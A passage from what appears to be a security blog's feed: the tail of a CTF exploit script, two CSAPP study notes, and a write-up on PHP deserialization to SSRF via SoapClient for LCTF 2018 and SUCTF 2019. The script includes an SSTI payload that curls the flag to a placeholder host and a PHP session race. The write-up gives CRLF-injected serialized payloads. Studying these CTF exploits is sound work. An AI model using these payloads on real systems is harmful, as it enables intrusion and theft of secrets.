class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">    &#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">        &#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">            &#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">                &#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">                &#123;% if b['eval']('getattr(__import__("os"),"popen")("curl your_host/`/readflag`")') %&#125;</span></span><br><span class="line"><span class="string">                &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">                &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">    &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + payload + <span class="string">'Z'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Warm-up&quot;&gt;&lt;a href=&quot;#Warm-up&quot; class=&quot;headerlink&quot; title=&quot;Warm up&quot;&gt;&lt;/a&gt;Warm up&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;常见绕过、gopher 打 MySQL、SSRF&lt;/p&gt;
&lt;/blockq
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 信息的表示和处理 笔记</title>
    <link href="https://wywwzjj.top/2019/09/08/CSAPP-Chapter-2-Notes/"/>
    <id>https://wywwzjj.top/2019/09/08/CSAPP-Chapter-2-Notes/</id>
    <published>2019-09-08T15:33:45.000Z</published>
    <updated>2019-10-11T14:32:14.122Z</updated>
    
    <content type="html"><![CDATA[<p>信息的表示是信息处理的基础。</p><p>计算机存储和处理的信息都是以二进制的形式表示，这与底层的物理结构有关。</p><blockquote><p>单个的位不是非常有用，然而，当把位组合在一起，再加上某种<em>解释</em>，即赋予不同的可能位模式以含义，我们就能够表示任何有限集合的元素。</p></blockquote><p>进一步的问题就是编码和解码，比如数据与文字该如何表示？</p><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><p>大多数计算机使用 8 位的块，作为最小的可寻址的内存单位（字节），而不是访问内存中单独的位。机械级程序将内存视为一个非常大的字节数组，称为虚拟内存。内存的每个字节都由一个唯一的数字来标识，该数字被称为<strong>地址</strong>，所有可能地址的集合称为<strong>虚拟地址空间</strong>。</p><p>十六进制表示，记一下 A、C、F 对应的十进制就好了。</p><blockquote><p>每当想起这些简单的算数、逻辑运算撑起了复杂抽象的信息处理，就不免感慨其神奇，万丈高楼平地起。</p></blockquote><h2 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h2><p>这些数值表示及其运算在学组原时就整理过好几遍了，没细看，回头想起再补充吧。</p><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;信息的表示是信息处理的基础。&lt;/p&gt;
&lt;p&gt;计算机存储和处理的信息都是以二进制的形式表示，这与底层的物理结构有关。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;单个的位不是非常有用，然而，当把位组合在一起，再加上某种&lt;em&gt;解释&lt;/em&gt;，即赋予不同的可能位模式以含义，我们就能
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 计算机系统漫游 笔记</title>
    <link href="https://wywwzjj.top/2019/09/01/CSAPP-Chapter-1-Notes/"/>
    <id>https://wywwzjj.top/2019/09/01/CSAPP-Chapter-1-Notes/</id>
    <published>2019-09-01T09:08:23.000Z</published>
    <updated>2019-10-11T13:46:17.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息-位-上下文"><a href="#信息-位-上下文" class="headerlink" title="信息 = 位 + 上下文"></a>信息 = 位 + 上下文</h2><p>编码是一切信息处理的基础。</p><h2 id="程序被其他程序翻译成不同的格式"><a href="#程序被其他程序翻译成不同的格式" class="headerlink" title="程序被其他程序翻译成不同的格式"></a>程序被其他程序翻译成不同的格式</h2><p><strong>编译过程：</strong></p><p>源程序（hello.c）=&gt; 预处理器 （hello.i） =&gt;  编译器（hello.s）  =&gt;  汇编器（hello.o）  =&gt;  链接器（可执行）</p><ul><li>预处理：以 # 开头的，直接修改源程序。比如 #include &lt;stdio.h&gt;，将直接把文件插入进来。</li><li>编译器：将此文本文件翻译成汇编语句。</li><li>汇编器：将汇编语句翻译成机器语言指令。</li><li>链接器：将用到的链接库合并。</li></ul><h2 id="了解编译系统如何工作大有益处"><a href="#了解编译系统如何工作大有益处" class="headerlink" title="了解编译系统如何工作大有益处"></a>了解编译系统如何工作大有益处</h2><ul><li>优化程序性能</li><li>理解链接时出现的错误</li><li>避免安全漏洞</li></ul><h2 id="处理器读并解释储存在内存中的指令"><a href="#处理器读并解释储存在内存中的指令" class="headerlink" title="处理器读并解释储存在内存中的指令"></a>处理器读并解释储存在内存中的指令</h2><h3 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h3><p>计算机：</p><ul><li>以硬件为基础</li><li>以软件扩充其功能</li><li>以执行程序的方式提现功能</li></ul><p>组成：</p><ul><li>总线：bus，各部件信息传输的渠道</li><li>I/O 设备：输入输出设备。输入信息  =&gt;  处理信息  =&gt;  输出信息</li><li>主存</li><li>处理器</li></ul><h3 id="运行-hello-程序"><a href="#运行-hello-程序" class="headerlink" title="运行 hello 程序"></a>运行 hello 程序</h3><h2 id="高速缓存至关重要"><a href="#高速缓存至关重要" class="headerlink" title="高速缓存至关重要"></a>高速缓存至关重要</h2><h2 id="存储设备形成层次结构"><a href="#存储设备形成层次结构" class="headerlink" title="存储设备形成层次结构"></a>存储设备形成层次结构</h2><h2 id="操作系统管理硬件"><a href="#操作系统管理硬件" class="headerlink" title="操作系统管理硬件"></a>操作系统管理硬件</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>一个进程可以由多个线程构成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p>为每个进程提供了一个假象，就好像每个进程都独占了主存。</p><p>每个程序执行时，内存起点都是一样的。</p><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h2 id="系统之间利用网络通信"><a href="#系统之间利用网络通信" class="headerlink" title="系统之间利用网络通信"></a>系统之间利用网络通信</h2><h2 id="Amdahl-定律"><a href="#Amdahl-定律" class="headerlink" title="Amdahl 定律"></a>Amdahl 定律</h2><h2 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h2><h2 id="抽象的重要性"><a href="#抽象的重要性" class="headerlink" title="抽象的重要性"></a>抽象的重要性</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息-位-上下文&quot;&gt;&lt;a href=&quot;#信息-位-上下文&quot; class=&quot;headerlink&quot; title=&quot;信息 = 位 + 上下文&quot;&gt;&lt;/a&gt;信息 = 位 + 上下文&lt;/h2&gt;&lt;p&gt;编码是一切信息处理的基础。&lt;/p&gt;
&lt;h2 id=&quot;程序被其他程序翻译成不同
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>当 PHP 反序列化遇上 SSRF</title>
    <link href="https://wywwzjj.top/2019/08/20/%E5%BD%93PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%81%87%E4%B8%8ASSRF/"/>
    <id>https://wywwzjj.top/2019/08/20/当PHP反序列化遇上SSRF/</id>
    <published>2019-08-20T06:08:23.000Z</published>
    <updated>2019-11-04T02:25:43.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SOAP-简介"><a href="#SOAP-简介" class="headerlink" title="SOAP 简介"></a>SOAP 简介</h2><p>SOAP（Simple Object Access Protocol）是一种在 web service 通信时所用的基于 xml 的协议。</p><p>远在天边，近在眼前，通过这种协议可以实现“本地”调用的效果。</p><p><strong>简单实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// soapServer</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> date(<span class="string">'Y-m-d'</span>, time());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$soap = <span class="keyword">new</span> SoapServer(<span class="keyword">null</span>,</span><br><span class="line">                      [<span class="string">'uri'</span> =&gt; <span class="string">'abcd'</span>]  <span class="comment">// namespace of the SOAP service</span></span><br><span class="line">                      );</span><br><span class="line">$soap-&gt;addFunction(<span class="string">'getTime'</span>);</span><br><span class="line">$soap-&gt;handle();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// soapClient</span></span><br><span class="line">$client = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,</span><br><span class="line">                        [<span class="string">'location'</span> =&gt; <span class="string">'http://example.com'</span>,  <span class="comment">// 服务端 URL</span></span><br><span class="line">                         <span class="string">'uri'</span> =&gt; <span class="string">'abcd'</span>]  <span class="comment">// 需要与服务端一致（只发起请求可以随意填）</span></span><br><span class="line">                        );</span><br><span class="line"><span class="keyword">echo</span> $client-&gt;getTime();  <span class="comment">// 得到服务端所返回的时间</span></span><br><span class="line"><span class="comment">// 这里非常重要，是反序列化到 SSRF 的核心（实际操作可调用任意方法）</span></span><br><span class="line"><span class="comment">// 这里调用了未定义的方法将唤起 __call 魔术方法，从而向 server 端发起一个请求，实现 SSRF 的效果</span></span><br></pre></td></tr></table></figure><p>还有一个很重要的利用点，CRLF 头注入，一个在 user_agent，一个在 uri，可惜的是这种方式只支持 http 协议。</p><p>下面来看一看具体的数据包：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y507mxzpj20lf07bt95.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y4o21s5fj20la08qt97.jpg" alt></p><p>不熟悉 CRLF 头注入利用方法的可以参考一下这篇文章，<a href="https://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html" target="_blank" rel="noopener">Trying to hack Redis via HTTP requests</a></p><h2 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h2><h3 id="2018-LCTF-babyphp’s-revenge"><a href="#2018-LCTF-babyphp’s-revenge" class="headerlink" title="2018 LCTF babyphp’s revenge"></a>2018 LCTF babyphp’s revenge</h3><blockquote><p>hint：反序列化</p></blockquote><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session_start(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] === <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目非常简洁，就两个文件。flag 的位置也很明确，但这有一个限制，只有来自 localhost 的访问才能将 flag 写入 session 中，意味着需要 SSRF 或者直接 getshell。</p><p>给的提示是反序列化，代码不多，不由得想到 session 里的反序列化，可以看看之前的一个题，<a href="https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/">从 session 角度学习反序列化</a> （与此题不相同的一点是，这里直接给了写 session 的接口，两题或许可以结合一下）</p><p>参照以前的思路，我们需要设置不同的序列化的处理器，来达到对象注入的目的。如何才能设置呢？</p><p>目光继续聚焦于 <code>session_start</code> ，官方文档给了一个重要提示：配置可覆盖（该进程下临时生效就够了）。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y600aa7cj20t90h6jut.jpg" alt></p><p>那要注入什么要的对象才能达到 SSRF 的目的呢？由于不能定义其他类，只好从内置类想办法，这时候 SoapClient 就可以闪亮登场了，上面已经铺垫了相关知识，这里着重解释处理手法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, [<span class="string">'location'</span> =&gt; <span class="string">'http://127.0.0.1/flag.php'</span>,</span><br><span class="line">                           <span class="string">'uri'</span> =&gt; <span class="string">"DDD\r\n"</span> . <span class="string">"Cookie: PHPSESSID=2"</span>]);</span><br><span class="line">   <span class="comment">// 别忘了带 Cookie，不然去哪看 flag ：)</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A24%3A%22DDD%0D%0ACookie%3A+PHPSESSID%3D2%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p>可看到语句成功写入 session</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6ncawvjj20yr0h2n0y.jpg" alt></p><p>再正常访问一下，session 里的语句被成功反序列化成为 SoapClient 对象</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6pukr6vj20yo0hjn03.jpg" alt></p><p>有人可能还是会有疑问，为什么一定要这样设置呢，不能赋值进去再自动反序列化吗？</p><p>这里多说一下，其实上面的文章已经有写过。先看一下基本的几种序列化的存储方式：</p><ul><li><code>php_binary</code>：键名的长度对应的 ASCII 字符 + 键名 + 经过 <code>serialize ()</code> 函数序列化处理的值</li><li><code>php</code>：键名 + 竖线 + 经过 <code>serialize ()</code> 函数序列处理的值</li><li><code>php_serialize</code> ：经过 <code>serialize ()</code> 函数序列化处理的值</li></ul><p>从 PHP 文档可查到，默认使用 php 这种序列化格式，也就是已经存在竖线的那种方式。</p><p>这种方式的反序列化有个小细节：PHP 获取到 session 字符串后就开始从左至右寻找竖线，找到后以竖线为分隔符，竖线前的为键名，后的做键值，并对键值进行反序列化。如果反序列化失败，则放弃此次解析，再以这样的方式网下寻找继续找。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">name</span>|<span class="selector-tag">s</span><span class="selector-pseudo">:163</span><span class="selector-pseudo">:"</span>|<span class="selector-tag">O</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"SoapClient"</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"uri"</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"location"</span>...</span><br></pre></td></tr></table></figure><p>像现在这种情况，出现了两个竖线，就会将后面整个 <code>s:163:&quot;O:&quot;</code> 字符串进行反序列化，得到的很可能就只是一个数组。</p><p>到这里，我们的对象注入总算是成功了，那该如何调用 <code>__call</code> 呢？</p><p>别忘了这还有一个 <code>reset</code> 函数：</p><blockquote><p><strong>reset()</strong> 将 <code>array</code> 的内部指针倒回到第一个单元并返回第一个数组单元的值</p></blockquote><p>也就是说，<code>reset($_SESSION)</code> 将返回的就是 SoapClient 对象，这就很棒了，得来全不费功夫。</p><p>我们可以先把 <code>$b</code> 覆盖成 <code>call_user_func</code> ，以下面这种形式进行调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">array</span>(SoapClient Object, <span class="string">'welcome_to_the_lctf2018'</span>));</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6vceceuj20yn0h2goc.jpg" alt></p><p>再正常访问就可以看到 flag 了。</p><h3 id="2019-SUCTF-upload2"><a href="#2019-SUCTF-upload2" class="headerlink" title="2019 SUCTF upload2"></a>2019 SUCTF upload2</h3><blockquote><p>考点：phar 反序列化、反射、SSRF、SoapClient</p></blockquote><p>简单说一下题目大意，有一个上传点（index.php），限制了图片后缀。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $file_name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $temp = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = <span class="keyword">new</span> Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check（class.php）里检查了是否含有 <code>&lt;?</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还有一个查看点（func.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">    $file-&gt;getMIME();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标在 admin.php 里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="comment">// 拿 flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可知只能打 SSRF，加上前面的一系列限制，直接传 webshell 是不太现实的。</p><p>综合总的题目情景，前一部分和 hitcon 2017 中的 baby^h-master-php-2017 很像，可由 <code>finfo_file($finfo, $this-&gt;file_name)</code> 触发反序列化，再通过 soap 打出 SSRF。</p><p>以下直接给出 exp：（具体分析可参考 De1ta 的 <a href="https://xz.aliyun.com/t/6042#toc-27" target="_blank" rel="noopener">wp</a>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 